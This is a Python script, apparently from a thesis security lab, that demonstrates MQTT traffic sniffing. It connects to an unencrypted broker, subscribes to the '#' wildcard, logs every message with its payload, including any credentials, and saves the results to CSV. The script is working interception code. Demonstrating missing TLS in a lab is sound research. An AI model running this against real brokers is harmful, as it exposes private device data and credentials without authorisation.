#!/usr/bin/env python3
"""
Attack 01 — MQTT Traffic Sniffing

Demonstrates that without TLS, any network participant can subscribe to the
wildcard topic '#' and read all MQTT traffic in cleartext. This includes
sensor values, device status, and any credentials that may be transmitted.

Usage:
    python attack_01_sniff.py [broker_host] [duration_seconds]
    python attack_01_sniff.py 10.10.0.10 30

Output:
    - Live console feed of all intercepted messages
    - CSV report saved to /attacks/results/sniff_<timestamp>.csv
"""

import json
import time
import csv
import sys
import os
import paho.mqtt.client as mqtt

BROKER_HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.10"
DURATION    = int(sys.argv[2]) if len(sys.argv) > 2 else 30

intercepted: list[dict] = []


def on_connect(client, userdata, flags, rc):
    """Subscribe to all topics once connected."""
    print(f"[*] Attacker connected to broker at {BROKER_HOST}:1883")
    client.subscribe("#")   # wildcard: intercept every single message
    print(f"[*] Subscribed to '#' — sniffing for {DURATION}s...")


def on_message(client, userdata, msg):
    """Record every intercepted message with metadata."""
    entry = {
        "timestamp": time.time(),
        "topic":     msg.topic,
        "qos":       msg.qos,
        "retain":    msg.retain,
        "payload":   msg.payload.decode(errors="replace"),
        "size_bytes": len(msg.payload)
    }
    intercepted.append(entry)
    print(f"[SNIFF] {msg.topic} -> {entry['payload'][:120]}")


def main():
    client = mqtt.Client(client_id="attacker-sniffer")
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(BROKER_HOST, 1883, keepalive=60)
    client.loop_start()

    time.sleep(DURATION)

    client.loop_stop()
    client.disconnect()

    # -------------------------------------------------------------------------
    # Save results to CSV for thesis documentation
    # -------------------------------------------------------------------------
    os.makedirs("/attacks/results", exist_ok=True)
    output_file = f"/attacks/results/sniff_{int(time.time())}.csv"

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(
            f, fieldnames=["timestamp", "topic", "qos", "retain", "payload", "size_bytes"]
        )
        writer.writeheader()
        writer.writerows(intercepted)

    # -------------------------------------------------------------------------
    # Summary statistics
    # -------------------------------------------------------------------------
    topics = set(e["topic"] for e in intercepted)
    print(f"\n{'='*50}")
    print(f"[+] Sniffing complete — {DURATION}s duration")
    print(f"[+] Messages intercepted : {len(intercepted)}")
    print(f"[+] Unique topics found  : {len(topics)}")
    print(f"{'='*50}")
    for t in sorted(topics):
        count = sum(1 for e in intercepted if e["topic"] == t)
        print(f"    {t}: {count} messages")
    print(f"\n[+] Results saved to: {output_file}")


if __name__ == "__main__":
    main()
